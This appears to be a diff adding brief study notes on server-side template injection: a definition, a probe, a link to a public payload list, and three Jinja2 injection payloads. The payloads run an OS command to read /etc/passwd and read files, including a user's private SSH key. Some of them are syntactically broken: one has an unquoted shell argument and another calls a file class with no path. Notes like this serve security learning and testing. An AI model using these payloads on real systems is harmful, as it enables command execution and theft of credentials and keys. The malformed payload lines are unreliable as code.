@@ -1,0 +1,11 @@
+SSTI - Templet engine that allows devs to use static HTML pages with dynamic elements. 
+-server side template injection: a user is able to pass in a parameter that can control the template engine that is running on the server
+-different template engines have different injection payloads
+-{{2+2}}
+
+List of Template injections
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#basic-injection
+
+{{config.__class__.__init__.__globals__['os'].popen(cat /etc/passwd).read()}}
+{{ ''.__class__.__mro__[2].__subclasses__()[40]()().read()}}
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/home/test/.ssh/id_rsa').read() }}
